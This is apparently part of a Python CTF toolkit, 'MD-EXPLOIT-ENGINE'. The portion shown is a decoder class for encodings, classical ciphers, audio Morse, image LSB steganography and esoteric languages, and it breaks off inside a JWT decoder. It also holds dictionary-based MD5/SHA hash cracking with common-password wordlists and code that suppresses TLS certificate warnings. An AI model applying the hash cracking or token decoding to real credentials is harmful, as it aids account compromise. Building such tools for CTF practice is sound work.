"""
================================================================================
MD-EXPLOIT-ENGINE - Web Exploitation Module
================================================================================
Developed by: Md Abu Shalem Alam
Description: Comprehensive web vulnerability scanner and exploiter for CTF challenges
Features: Steganography, Encoding/Decoding, Caesar Cipher, Morse Code, and more
================================================================================
"""

import re
import json
import base64
import hashlib
import requests
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from typing import Optional, List, Dict, Any
import time
import threading
import warnings
import urllib3
import binascii
import codecs
import struct
import concurrent.futures

__author__ = "Md Abu Shalem Alam"

# Suppress SSL warnings for CTF challenges (many use self-signed certs)
warnings.filterwarnings('ignore', category=urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.challenge import Challenge, ChallengeResult
from .base import BaseModule


class CTFDecoder:
    """Comprehensive decoder for CTF challenges - handles multiple encoding types"""
    
    # JavaScript packer patterns
    JS_PACKER_PATTERNS = [
        r'eval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e\s*,\s*[dr]\s*\)',  # Dean Edwards packer
        r'eval\s*\(\s*function\s*\(\s*h\s*,\s*u\s*,\s*n\s*,\s*t\s*,\s*e\s*,\s*r\s*\)',  # Hunterians packer
        r'_0x[a-f0-9]+\s*=\s*\[',  # Obfuscator.io style
        r'var\s+_0x[a-f0-9]+\s*=',  # Obfuscator.io variables
        r'\\x[0-9a-f]{2}',  # Hex encoded strings
        r'\\u[0-9a-f]{4}',  # Unicode encoded strings
        r'String\[[\'"](\\x|\\u)',  # String method obfuscation
        r'atob\s*\(',  # Base64 decode
        r'btoa\s*\(',  # Base64 encode
    ]
    
    # Common CTF cipher keywords
    CIPHER_KEYWORDS = [
        'caesar', 'rot13', 'rot', 'shift', 'vigenere', 'atbash', 'morse',
        'base64', 'base32', 'hex', 'binary', 'xor', 'cipher', 'encrypt',
        'decode', 'encode', 'secret', 'hidden', 'flag', 'key', 'password'
    ]
    
    # Morse code mapping
    MORSE_CODE = {
        '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
        '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
        '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
        '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
        '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
        '--..': 'Z', '-----': '0', '.----': '1', '..---': '2',
        '...--': '3', '....-': '4', '.....': '5', '-....': '6',
        '--...': '7', '---..': '8', '----.': '9', '/': ' ', ' / ': ' ',
        '.-.-.-': '.', '--..--': ',', '..--..': '?', '.----.': "'",
        '-.-.--': '!', '-..-.': '/', '-.--.': '(', '-.--.-': ')',
        '.-...': '&', '---...': ':', '-.-.-.': ';', '-...-': '=',
        '.-.-.': '+', '-....-': '-', '..--.-': '_', '.-..-.': '"',
        '...-..-': '$', '.--.-.': '@',
    }
    
    # Reverse morse lookup
    CHAR_TO_MORSE = {v: k for k, v in MORSE_CODE.items() if len(k) > 0}
    
    @classmethod
    def decode_morse_audio(cls, audio_data: bytes) -> Optional[str]:
        """Decode Morse code from WAV audio data"""
        try:
            import numpy as np
            import wave
            import io
            
            # Read WAV file from bytes
            wav_io = io.BytesIO(audio_data)
            with wave.open(wav_io, 'rb') as wav_file:
                sample_rate = wav_file.getframerate()
                n_frames = wav_file.getnframes()
                audio_frames = wav_file.readframes(n_frames)
                n_channels = wav_file.getnchannels()
                sample_width = wav_file.getsampwidth()
            
            # Convert to numpy array with proper handling for different bit depths
            if sample_width == 1:
                # 8-bit unsigned audio, center is 128
                audio = np.frombuffer(audio_frames, dtype=np.uint8).astype(np.float64)
                audio = audio - 128  # Center around 0
            elif sample_width == 2:
                audio = np.frombuffer(audio_frames, dtype=np.int16).astype(np.float64)
            else:
                audio = np.frombuffer(audio_frames, dtype=np.int32).astype(np.float64)
            
            # If stereo, take first channel
            if n_channels == 2:
                audio = audio[::2]
            
            # Calculate envelope using absolute value and smoothing
            window_size = int(sample_rate * 0.01)  # 10ms window
            if window_size < 1:
                window_size = 1
            
            audio_abs = np.abs(audio)
            envelope = np.convolve(audio_abs, np.ones(window_size)/window_size, mode='same')
            
            # Calculate threshold for signal detection
            threshold = np.max(envelope) * 0.4
            
            # Detect signal (above threshold = 1, below = 0)
            signal = (envelope > threshold).astype(int)
            
            # Find transitions
            diff = np.diff(signal)
            starts = np.where(diff == 1)[0]
            ends = np.where(diff == -1)[0]
            
            # Handle case where audio starts with signal
            if len(signal) > 0 and signal[0] == 1:
                starts = np.insert(starts, 0, 0)
            
            # Handle case where audio ends with signal
            if len(signal) > 0 and signal[-1] == 1:
                ends = np.append(ends, len(signal) - 1)
            
            if len(starts) == 0 or len(ends) == 0:
                return None
            
            # Align starts and ends
            if ends[0] < starts[0]:
                ends = ends[1:]
            if len(starts) > len(ends):
                starts = starts[:len(ends)]
            
            if len(starts) == 0:
                return None
            
            # Calculate durations in milliseconds
            on_durations = (ends - starts) / sample_rate * 1000
            
            # Find gaps between signals in milliseconds
            if len(starts) > 1:
                gaps = (starts[1:] - ends[:-1]) / sample_rate * 1000
            else:
                gaps = np.array([])
            
            # Find dot and dash durations using clustering
            min_dur = np.min(on_durations)
            max_dur = np.max(on_durations)
            
            # Threshold between dot and dash (midpoint)
            dot_dash_threshold = (min_dur + max_dur) / 2
            
            # Gap thresholds based on dot duration
            dot_duration = min_dur
            letter_gap_threshold = dot_duration * 2.5
            word_gap_threshold = dot_duration * 5
            
            # Decode signals to dots and dashes
            morse_code = ""
            for i, duration in enumerate(on_durations):
                if duration < dot_dash_threshold:
                    morse_code += "."
                else:
                    morse_code += "-"
                
                # Add space based on gap
                if i < len(gaps):
                    gap = gaps[i]
                    if gap > word_gap_threshold:
                        morse_code += " / "  # Word separator
                    elif gap > letter_gap_threshold:
                        morse_code += " "  # Letter separator
            
            # Decode morse to text
            result = cls.decode_morse(morse_code)
            return result
            
        except ImportError:
            return None
        except Exception as e:
            return None
    
    @classmethod
    def decode_image_lsb(cls, image_data: bytes) -> Optional[str]:
        """Extract hidden message from image using LSB steganography"""
        try:
            from PIL import Image
            import io
            
            # Open image from bytes
            img = Image.open(io.BytesIO(image_data))
            
            # Convert to RGB if needed
            if img.mode not in ('RGB', 'RGBA'):
                img = img.convert('RGB')
            
            # Get pixel data
            pixels = list(img.getdata())
            
            # Extract LSB from each pixel channel
            bits = ''
            for pixel in pixels[:10000]:  # Check first 10000 pixels
                channels = pixel[:3] if len(pixel) >= 3 else pixel
                for channel in channels:
                    bits += str(channel & 1)
            
            # Convert bits to bytes and look for readable text
            message = ''
            for i in range(0, len(bits) - 8, 8):
                byte = bits[i:i+8]
                char_code = int(byte, 2)
                if 32 <= char_code <= 126:  # Printable ASCII
                    message += chr(char_code)
                elif char_code == 0 and len(message) > 5:
                    # Null terminator - end of message
                    break
                elif len(message) > 5 and not (32 <= char_code <= 126):
                    # Non-printable after some text - likely end
                    break
            
            # Return if we found meaningful text
            if len(message) >= 5 and any(c.isalpha() for c in message):
                return message.strip()
            
            return None
            
        except ImportError:
            return None
        except Exception as e:
            return None
    
    # Binary to text
    @staticmethod
    def decode_binary(text: str) -> Optional[str]:
        """Decode binary string to text"""
        try:
            # Remove spaces and common separators
            binary = re.sub(r'[^01]', ' ', text)
            bytes_list = binary.split()
            if not bytes_list:
                # Try without spaces (8-bit chunks)
                binary = re.sub(r'[^01]', '', text)
                bytes_list = [binary[i:i+8] for i in range(0, len(binary), 8)]
            
            result = ''
            for byte in bytes_list:
                if len(byte) == 8:
                    result += chr(int(byte, 2))
            return result if result and len(result) > 2 else None
        except:
            return None
    
    # Hex to text
    @staticmethod
    def decode_hex(text: str) -> Optional[str]:
        """Decode hex string to text"""
        try:
            # Remove common prefixes and separators
            hex_str = re.sub(r'(0x|\\x|:|\s)', '', text)
            if len(hex_str) % 2 == 0:
                return bytes.fromhex(hex_str).decode('utf-8', errors='ignore')
        except:
            pass
        return None
    
    # Octal to text
    @staticmethod
    def decode_octal(text: str) -> Optional[str]:
        """Decode octal string to text"""
        try:
            # Match octal patterns like \141 or 141
            octal_pattern = r'\\?([0-7]{3})'
            matches = re.findall(octal_pattern, text)
            if matches:
                return ''.join(chr(int(o, 8)) for o in matches)
        except:
            pass
        return None
    
    # Decimal/ASCII to text
    @staticmethod
    def decode_decimal(text: str) -> Optional[str]:
        """Decode decimal ASCII values to text"""
        try:
            # Match numbers separated by spaces, commas, etc.
            numbers = re.findall(r'\d+', text)
            if numbers:
                result = ''.join(chr(int(n)) for n in numbers if 0 <= int(n) <= 127)
                return result if len(result) > 2 else None
        except:
            pass
        return None
    
    # Base64 decode
    @staticmethod
    def decode_base64(text: str) -> Optional[str]:
        """Decode base64 string"""
        try:
            # Add padding if needed
            padding = 4 - len(text) % 4
            if padding != 4:
                text += '=' * padding
            return base64.b64decode(text).decode('utf-8', errors='ignore')
        except:
            pass
        return None
    
    # Base32 decode
    @staticmethod
    def decode_base32(text: str) -> Optional[str]:
        """Decode base32 string"""
        try:
            # Add padding if needed
            padding = 8 - len(text) % 8
            if padding != 8:
                text += '=' * padding
            return base64.b32decode(text.upper()).decode('utf-8', errors='ignore')
        except:
            pass
        return None
    
    # Base16 (hex) decode
    @staticmethod
    def decode_base16(text: str) -> Optional[str]:
        """Decode base16 string"""
        try:
            return base64.b16decode(text.upper()).decode('utf-8', errors='ignore')
        except:
            pass
        return None
    
    # URL decode
    @staticmethod
    def decode_url(text: str) -> Optional[str]:
        """Decode URL encoded string"""
        try:
            decoded = urllib.parse.unquote(text)
            return decoded if decoded != text else None
        except:
            pass
        return None
    
    # HTML entities decode
    @staticmethod
    def decode_html_entities(text: str) -> Optional[str]:
        """Decode HTML entities"""
        try:
            import html
            decoded = html.unescape(text)
            return decoded if decoded != text else None
        except:
            pass
        return None
    
    # ROT13 decode
    @staticmethod
    def decode_rot13(text: str) -> Optional[str]:
        """Decode ROT13"""
        try:
            return codecs.decode(text, 'rot_13')
        except:
            pass
        return None
    
    # Caesar cipher decode (all shifts)
    @staticmethod
    def decode_caesar(text: str, shift: int = None) -> Optional[str]:
        """Decode Caesar cipher with given shift or try all"""
        def shift_text(t, s):
            result = ''
            for ch in t:
                if ch.isalpha():
                    base = ord('A') if ch.isupper() else ord('a')
                    result += chr((ord(ch) - base - s) % 26 + base)
                else:
                    result += ch
            return result
        
        if shift is not None:
            return shift_text(text, shift)
        
        # Try all shifts and return most English-like
        common_words = ['the', 'and', 'for', 'are', 'but', 'not', 'you', 'all', 
                       'flag', 'ctf', 'key', 'secret', 'password', 'admin',
                       'ball', 'court', 'front', 'basket', 'in', 'of', 'to']
        
        best_result = None
        best_score = 0
        
        for s in range(1, 26):
            decoded = shift_text(text, s)
            score = sum(1 for word in common_words if word in decoded.lower())
            if score > best_score:
                best_score = score
                best_result = decoded
        
        return best_result if best_score >= 2 else None
    
    # Atbash cipher decode
    @staticmethod
    def decode_atbash(text: str) -> Optional[str]:
        """Decode Atbash cipher (reverse alphabet)"""
        try:
            result = ''
            for ch in text:
                if ch.isalpha():
                    if ch.isupper():
                        result += chr(ord('Z') - (ord(ch) - ord('A')))
                    else:
                        result += chr(ord('z') - (ord(ch) - ord('a')))
                else:
                    result += ch
            return result
        except:
            pass
        return None
    
    # Vigenere cipher decode (with key guessing)
    @staticmethod
    def decode_vigenere(text: str, key: str = None) -> Optional[str]:
        """Decode Vigenere cipher"""
        if not key:
            # Try common CTF keys
            common_keys = ['flag', 'ctf', 'key', 'secret', 'password', 'admin', 'hack']
            for k in common_keys:
                result = CTFDecoder.decode_vigenere(text, k)
                if result and CTFDecoder._looks_english(result):
                    return result
            return None
        
        try:
            result = ''
            key = key.lower()
            key_idx = 0
            for ch in text:
                if ch.isalpha():
                    shift = ord(key[key_idx % len(key)]) - ord('a')
                    if ch.isupper():
                        result += chr((ord(ch) - ord('A') - shift) % 26 + ord('A'))
                    else:
                        result += chr((ord(ch) - ord('a') - shift) % 26 + ord('a'))
                    key_idx += 1
                else:
                    result += ch
            return result
        except:
            pass
        return None
    
    # Morse code decode
    @staticmethod
    def decode_morse(text: str) -> Optional[str]:
        """Decode Morse code"""
        try:
            # Normalize separators
            text = text.replace('/', ' / ')
            words = text.split(' / ')
            decoded_words = []
            
            for word in words:
                letters = word.strip().split()
                decoded_word = ''
                for letter in letters:
                    letter = letter.strip()
                    if letter in CTFDecoder.MORSE_CODE:
                        decoded_word += CTFDecoder.MORSE_CODE[letter]
                if decoded_word:
                    decoded_words.append(decoded_word)
            
            return ' '.join(decoded_words) if decoded_words else None
        except:
            pass
        return None
    
    # Reverse string
    @staticmethod
    def decode_reverse(text: str) -> Optional[str]:
        """Reverse the string"""
        return text[::-1]
    
    # Rail fence cipher decode
    @staticmethod
    def decode_rail_fence(text: str, rails: int = 3) -> Optional[str]:
        """Decode Rail Fence cipher"""
        try:
            n = len(text)
            fence = [[None] * n for _ in range(rails)]
            
            # Mark positions
            rail, direction = 0, 1
            for i in range(n):
                fence[rail][i] = True
                rail += direction
                if rail == 0 or rail == rails - 1:
                    direction *= -1
            
            # Fill in characters
            idx = 0
            for r in range(rails):
                for c in range(n):
                    if fence[r][c]:
                        fence[r][c] = text[idx]
                        idx += 1
            
            # Read off
            result = ''
            rail, direction = 0, 1
            for i in range(n):
                result += fence[rail][i]
                rail += direction
                if rail == 0 or rail == rails - 1:
                    direction *= -1
            
            return result
        except:
            pass
        return None
    
    # XOR decode with common keys
    @staticmethod
    def decode_xor(data: bytes, key: bytes = None) -> Optional[str]:
        """XOR decode with key"""
        if key:
            result = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
            try:
                return result.decode('utf-8', errors='ignore')
            except:
                return None
        
        # Try single-byte XOR
        for k in range(256):
            try:
                result = bytes([b ^ k for b in data])
                decoded = result.decode('utf-8', errors='ignore')
                if CTFDecoder._looks_english(decoded):
                    return decoded
            except:
                continue
        return None
    
    # Bacon cipher decode
    @staticmethod
    def decode_bacon(text: str) -> Optional[str]:
        """Decode Bacon cipher (A/B or case-based)"""
        bacon_dict = {
            'AAAAA': 'A', 'AAAAB': 'B', 'AAABA': 'C', 'AAABB': 'D', 'AABAA': 'E',
            'AABAB': 'F', 'AABBA': 'G', 'AABBB': 'H', 'ABAAA': 'I', 'ABAAB': 'J',
            'ABABA': 'K', 'ABABB': 'L', 'ABBAA': 'M', 'ABBAB': 'N', 'ABBBA': 'O',
            'ABBBB': 'P', 'BAAAA': 'Q', 'BAAAB': 'R', 'BAABA': 'S', 'BAABB': 'T',
            'BABAA': 'U', 'BABAB': 'V', 'BABBA': 'W', 'BABBB': 'X', 'BBAAA': 'Y',
            'BBAAB': 'Z',
        }
        
        try:
            # Convert case-based to A/B
            ab_text = ''
            for ch in text:
                if ch.isalpha():
                    ab_text += 'A' if ch.islower() else 'B'
            
            # Decode in groups of 5
            result = ''
            for i in range(0, len(ab_text) - 4, 5):
                group = ab_text[i:i+5]
                if group in bacon_dict:
                    result += bacon_dict[group]
            
            return result if result else None
        except:
            pass
        return None
    
    # A1Z26 cipher decode (A=1, B=2, etc.)
    @staticmethod
    def decode_a1z26(text: str) -> Optional[str]:
        """Decode A1Z26 cipher (numbers to letters)"""
        try:
            numbers = re.findall(r'\d+', text)
            result = ''
            for n in numbers:
                num = int(n)
                if 1 <= num <= 26:
                    result += chr(ord('A') + num - 1)
            return result if result else None
        except:
            pass
        return None
    
    # Phone keypad decode (T9)
    @staticmethod
    def decode_phone(text: str) -> Optional[str]:
        """Decode phone keypad (T9) encoding"""
        keypad = {
            '2': 'ABC', '3': 'DEF', '4': 'GHI', '5': 'JKL',
            '6': 'MNO', '7': 'PQRS', '8': 'TUV', '9': 'WXYZ'
        }
        
        try:
            # Pattern like 22 = B, 222 = C, etc.
            groups = re.findall(r'(\d)\1*', text)
            result = ''
            for match in re.finditer(r'(\d)\1*', text):
                digit = match.group(1)
                count = len(match.group(0))
                if digit in keypad:
                    letters = keypad[digit]
                    idx = (count - 1) % len(letters)
                    result += letters[idx]
            return result if result else None
        except:
            pass
        return None
    
    @staticmethod
    def _looks_english(text: str) -> bool:
        """Check if text looks like English"""
        if not text or len(text) < 3:
            return False
        common_words = ['the', 'and', 'for', 'are', 'but', 'not', 'you', 'all',
                       'flag', 'ctf', 'key', 'secret', 'password', 'admin',
                       'ball', 'court', 'front', 'basket', 'in', 'of', 'to',
                       'is', 'it', 'be', 'as', 'at', 'so', 'we', 'he', 'by',
                       'or', 'on', 'do', 'if', 'me', 'my', 'up', 'an', 'go',
                       'meet', 'place', 'location', 'building', 'room', 'hall']
        text_lower = text.lower()
        return any(word in text_lower for word in common_words)
    
    # Common CTF words for hash cracking
    COMMON_CTF_WORDS = [
        # Locations
        'library', 'cafeteria', 'gym', 'auditorium', 'parking', 'entrance', 'exit',
        'lobby', 'office', 'classroom', 'lab', 'garden', 'roof', 'basement',
        'hall', 'corridor', 'stairs', 'elevator', 'gate', 'door', 'window',
        'meet', 'meeting', 'place', 'spot', 'point', 'location', 'area',
        'room', 'building', 'floor', 'block', 'wing', 'section', 'zone',
        'canteen', 'reception', 'lounge', 'terrace', 'balcony', 'attic',
        # Common CTF flags
        'flag', 'ctf', 'secret', 'hidden', 'password', 'admin', 'root',
        'key', 'token', 'hash', 'code', 'cipher', 'crypto', 'hack',
        # Short phrases
        'meet me', 'come here', 'go there', 'find me', 'look here',
        'at the', 'in the', 'on the', 'by the', 'near the',
        'front door', 'back door', 'main gate', 'side entrance',
        'parking lot', 'bus stop', 'train station', 'coffee shop',
        # Extended location phrases
        'main building', 'old building', 'new building', 'admin block',
        'ground floor', 'first floor', 'second floor', 'third floor',
        'basketball court', 'tennis court', 'football field', 'playground',
        'swimming pool', 'parking area', 'main entrance', 'back entrance',
        'computer lab', 'science lab', 'chemistry lab', 'physics lab',
        'conference room', 'waiting room', 'staff room', 'common room',
        'rooftop', 'staircase', 'lift', 'washroom', 'restroom',
        # More meeting spots
        'under the tree', 'behind the building', 'near the gate',
        'at the corner', 'by the fountain', 'in the park',
        'at the bench', 'near the statue', 'by the clock',
        # Gymkhana variations (common in Indian CTFs)
        'gym khana', 'gymkhana', 'gymkhana ground', 'gymkhana hall',
        'at gymkhana', 'near gymkhana', 'gymkhana building',
    ]
    
    @classmethod
    def crack_md5(cls, hash_value: str, xor_key: int = None) -> Optional[str]:
        """Try to crack MD5 hash using common words and XOR variations"""
        import hashlib
        
        hash_value = hash_value.lower().strip()
        
        # Try direct hash lookup
        for word in cls.COMMON_CTF_WORDS:
            # Try word as-is
            if hashlib.md5(word.encode()).hexdigest() == hash_value:
                return word
            
            # Try uppercase
            if hashlib.md5(word.upper().encode()).hexdigest() == hash_value:
                return word.upper()
            
            # Try title case
            if hashlib.md5(word.title().encode()).hexdigest() == hash_value:
                return word.title()
        
        # Try with XOR key if provided
        if xor_key:
            for word in cls.COMMON_CTF_WORDS:
                # XOR each character
                xored = ''.join(chr(ord(c) ^ xor_key) for c in word)
                if hashlib.md5(xored.encode()).hexdigest() == hash_value:
                    return word
                
                # Try uppercase XOR
                xored_upper = ''.join(chr(ord(c) ^ xor_key) for c in word.upper())
                if hashlib.md5(xored_upper.encode()).hexdigest() == hash_value:
                    return word.upper()
        
        # Try common XOR keys (1-255)
        for key in [77, 42, 13, 7, 255, 128, 64, 32, 16, 8, 4, 2, 1]:
            for word in cls.COMMON_CTF_WORDS[:20]:  # Limit for performance
                xored = ''.join(chr(ord(c) ^ key) for c in word)
                try:
                    if hashlib.md5(xored.encode()).hexdigest() == hash_value:
                        return f"{word} (XOR key: {key})"
                except:
                    pass
        
        return None
    
    @classmethod
    def crack_hash(cls, hash_value: str, hash_type: str = 'auto') -> Optional[str]:
        """Try to crack various hash types"""
        import hashlib
        
        hash_value = hash_value.lower().strip()
        hash_len = len(hash_value)
        
        # Determine hash type by length
        if hash_type == 'auto':
            if hash_len == 32:
                hash_type = 'md5'
            elif hash_len == 40:
                hash_type = 'sha1'
            elif hash_len == 64:
                hash_type = 'sha256'
            else:
                return None
        
        # Extended wordlist
        wordlist = cls.COMMON_CTF_WORDS + [
            'test', 'demo', 'example', 'sample', 'default',
            '123456', 'password', 'admin123', 'root123', 'letmein',
            'welcome', 'monkey', 'dragon', 'master', 'qwerty',
        ]
        
        for word in wordlist:
            for variant in [word, word.upper(), word.title(), word.lower()]:
                try:
                    if hash_type == 'md5':
                        if hashlib.md5(variant.encode()).hexdigest() == hash_value:
                            return variant
                    elif hash_type == 'sha1':
                        if hashlib.sha1(variant.encode()).hexdigest() == hash_value:
                            return variant
                    elif hash_type == 'sha256':
                        if hashlib.sha256(variant.encode()).hexdigest() == hash_value:
                            return variant
                except:
                    pass
        
        return None
    
    # ==================== ADVANCED DECODERS ====================
    
    @classmethod
    def decode_base58(cls, text: str) -> Optional[str]:
        """Decode Base58 (Bitcoin-style) string"""
        try:
            alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
            num = 0
            for char in text:
                num = num * 58 + alphabet.index(char)
            result = []
            while num > 0:
                result.append(num % 256)
                num //= 256
            # Add leading zeros
            for char in text:
                if char == '1':
                    result.append(0)
                else:
                    break
            return bytes(reversed(result)).decode('utf-8', errors='ignore')
        except:
            return None
    
    @classmethod
    def decode_base85(cls, text: str) -> Optional[str]:
        """Decode Base85/Ascii85 string"""
        try:
            import base64
            # Try standard base85
            return base64.b85decode(text).decode('utf-8', errors='ignore')
        except:
            try:
                # Try ascii85
                import base64
                return base64.a85decode(text).decode('utf-8', errors='ignore')
            except:
                return None
    
    @classmethod
    def decode_punycode(cls, text: str) -> Optional[str]:
        """Decode Punycode (internationalized domain names)"""
        try:
            if text.startswith('xn--'):
                return text.encode().decode('idna')
            return text.encode('ascii').decode('punycode')
        except:
            return None
    
    @classmethod
    def decode_quoted_printable(cls, text: str) -> Optional[str]:
        """Decode Quoted-Printable encoding"""
        try:
            import quopri
            return quopri.decodestring(text.encode()).decode('utf-8', errors='ignore')
        except:
            return None
    
    @classmethod
    def decode_uuencode(cls, text: str) -> Optional[str]:
        """Decode UUEncoded string"""
        try:
            import uu
            import io
            in_file = io.BytesIO(text.encode())
            out_file = io.BytesIO()
            uu.decode(in_file, out_file)
            return out_file.getvalue().decode('utf-8', errors='ignore')
        except:
            return None
    
    @classmethod
    def decode_brainfuck(cls, code: str) -> Optional[str]:
        """Execute Brainfuck code and return output"""
        try:
            # Simple Brainfuck interpreter
            code = ''.join(c for c in code if c in '><+-.,[]')
            if not code or len(code) < 5:
                return None
            
            tape = [0] * 30000
            ptr = 0
            output = []
            code_ptr = 0
            loop_stack = []
            
            max_iterations = 100000
            iterations = 0
            
            while code_ptr < len(code) and iterations < max_iterations:
                iterations += 1
                cmd = code[code_ptr]
                
                if cmd == '>':
                    ptr = (ptr + 1) % 30000
                elif cmd == '<':
                    ptr = (ptr - 1) % 30000
                elif cmd == '+':
                    tape[ptr] = (tape[ptr] + 1) % 256
                elif cmd == '-':
                    tape[ptr] = (tape[ptr] - 1) % 256
                elif cmd == '.':
                    if 32 <= tape[ptr] <= 126 or tape[ptr] in [10, 13]:
                        output.append(chr(tape[ptr]))
                elif cmd == '[':
                    if tape[ptr] == 0:
                        depth = 1
                        while depth > 0:
                            code_ptr += 1
                            if code[code_ptr] == '[':
                                depth += 1
                            elif code[code_ptr] == ']':
                                depth -= 1
                    else:
                        loop_stack.append(code_ptr)
                elif cmd == ']':
                    if tape[ptr] != 0:
                        code_ptr = loop_stack[-1]
                    else:
                        loop_stack.pop()
                
                code_ptr += 1
            
            result = ''.join(output)
            return result if len(result) > 2 else None
        except:
            return None
    
    @classmethod
    def decode_ook(cls, code: str) -> Optional[str]:
        """Decode Ook! programming language (Brainfuck variant)"""
        try:
            # Convert Ook! to Brainfuck
            ook_to_bf = {
                'Ook. Ook?': '>',
                'Ook? Ook.': '<',
                'Ook. Ook.': '+',
                'Ook! Ook!': '-',
                'Ook! Ook.': '.',
                'Ook. Ook!': ',',
                'Ook! Ook?': '[',
                'Ook? Ook!': ']',
            }
            
            bf_code = ''
            i = 0
            tokens = code.replace('\n', ' ').split()
            
            while i < len(tokens) - 1:
                pair = tokens[i] + ' ' + tokens[i + 1]
                if pair in ook_to_bf:
                    bf_code += ook_to_bf[pair]
                    i += 2
                else:
                    i += 1
            
            if bf_code:
                return cls.decode_brainfuck(bf_code)
            return None
        except:
            return None
    
    @classmethod
    def decode_jsfuck(cls, code: str) -> Optional[str]:
        """Attempt to decode JSFuck obfuscation"""
        try:
            # JSFuck uses only []()!+ characters
            if not all(c in '[]()!+ \n\t' for c in code):
                return None
            
            # Look for patterns that might reveal the decoded string
            # This is a simplified approach - full JSFuck decoding requires JS execution
            
            # Try to find string literals in the code
            string_patterns = [
                r'\["([^"]+)"\]',
                r"'([^']+)'",
            ]
            
            for pattern in string_patterns:
                matches = re.findall(pattern, code)
                if matches:
                    return ' '.join(matches)
            
            return None
        except:
            return None
    
    @classmethod
    def decode_affine(cls, text: str, a: int = None, b: int = None) -> Optional[str]:
        """Decode Affine cipher"""
        try:
            if a is None or b is None:
                # Try common values
                common_a = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]
                for test_a in common_a:
                    for test_b in range(26):
                        result = cls.decode_affine(text, test_a, test_b)
                        if result and cls._looks_english(result):
                            return result
                return None
            
            # Find modular multiplicative inverse of a
            def mod_inverse(a, m):
                for x in range(1, m):
                    if (a * x) % m == 1:
                        return x
                return None
            
            a_inv = mod_inverse(a, 26)
            if a_inv is None:
                return None
            
            result = ''
            for char in text:
                if char.isalpha():
                    base = ord('A') if char.isupper() else ord('a')
                    x = ord(char) - base
                    decoded = (a_inv * (x - b)) % 26
                    result += chr(decoded + base)
                else:
                    result += char
            
            return result
        except:
            return None
    
    @classmethod
    def decode_substitution(cls, text: str, key: str = None) -> Optional[str]:
        """Attempt to decode simple substitution cipher using frequency analysis"""
        try:
            if key:
                # Direct substitution with provided key
                alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                result = ''
                for char in text:
                    if char.upper() in key.upper():
                        idx = key.upper().index(char.upper())
                        new_char = alphabet[idx]
                        result += new_char.lower() if char.islower() else new_char
                    else:
                        result += char
                return result
            
            # Frequency analysis approach
            # English letter frequency (most to least common)
            english_freq = 'ETAOINSHRDLCUMWFGYPBVKJXQZ'
            
            # Count letter frequencies in ciphertext
            freq = {}
            for char in text.upper():
                if char.isalpha():
                    freq[char] = freq.get(char, 0) + 1
            
            if not freq:
                return None
            
            # Sort by frequency
            sorted_cipher = sorted(freq.keys(), key=lambda x: freq[x], reverse=True)
            
            # Create mapping
            mapping = {}
            for i, char in enumerate(sorted_cipher):
                if i < len(english_freq):
                    mapping[char] = english_freq[i]
            
            # Apply mapping
            result = ''
            for char in text:
                if char.upper() in mapping:
                    new_char = mapping[char.upper()]
                    result += new_char.lower() if char.islower() else new_char
                else:
                    result += char
            
            return result if cls._looks_english(result) else None
        except:
            return None
    
    @classmethod
    def decode_tap_code(cls, text: str) -> Optional[str]:
        """Decode Tap Code (Polybius cipher variant)"""
        try:
            # Tap code grid (K is replaced by C)
            grid = [
                ['A', 'B', 'C', 'D', 'E'],
                ['F', 'G', 'H', 'I', 'J'],
                ['L', 'M', 'N', 'O', 'P'],
                ['Q', 'R', 'S', 'T', 'U'],
                ['V', 'W', 'X', 'Y', 'Z'],
            ]
            
            # Parse tap patterns (e.g., ".. ..." = row 2, col 3 = H)
            # Or numeric format "23" = H
            result = ''
            
            # Try numeric format first
            numbers = re.findall(r'(\d)(\d)', text.replace(' ', ''))
            if numbers:
                for row, col in numbers:
                    r, c = int(row) - 1, int(col) - 1
                    if 0 <= r < 5 and 0 <= c < 5:
                        result += grid[r][c]
                if result:
                    return result
            
            # Try dot format
            pairs = text.split()
            i = 0
            while i < len(pairs) - 1:
                row = pairs[i].count('.') or pairs[i].count('*')
                col = pairs[i + 1].count('.') or pairs[i + 1].count('*')
                if 1 <= row <= 5 and 1 <= col <= 5:
                    result += grid[row - 1][col - 1]
                i += 2
            
            return result if result else None
        except:
            return None
    
    @classmethod
    def decode_polybius(cls, text: str) -> Optional[str]:
        """Decode Polybius square cipher"""
        try:
            grid = [
                ['A', 'B', 'C', 'D', 'E'],
                ['F', 'G', 'H', 'I', 'J'],
                ['K', 'L', 'M', 'N', 'O'],
                ['P', 'Q', 'R', 'S', 'T'],
                ['U', 'V', 'W', 'X', 'Y'],
            ]
            # Z is typically represented as 55 or omitted
            
            # Extract number pairs
            numbers = re.findall(r'(\d)(\d)', text.replace(' ', ''))
            if not numbers:
                return None
            
            result = ''
            for row, col in numbers:
                r, c = int(row) - 1, int(col) - 1
                if 0 <= r < 5 and 0 <= c < 5:
                    result += grid[r][c]
            
            return result if result else None
        except:
            return None
    
    @classmethod
    def decode_pigpen(cls, text: str) -> Optional[str]:
        """Decode Pigpen cipher (text representation)"""
        # This handles text-based pigpen representations
        # Actual image-based pigpen would need image processing
        try:
            # Common text representations of pigpen
            pigpen_map = {
                'J': 'A', 'L': 'B', '_|': 'C', '|_': 'D',
                # Add more mappings as needed
            }
            
            result = ''
            for char in text.upper():
                if char in pigpen_map:
                    result += pigpen_map[char]
                elif char.isalpha():
                    result += char
            
            return result if result else None
        except:
            return None
    
    @classmethod
    def decode_jwt(cls, token: str) -> Optional[Dict]:
        """Decode JWT token (without verification)"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode header and payload
            def decode_part(part):
                # Add padding
                padding = 4 - len(part) % 4
                if padding != 4:
                    part += '=' * padding
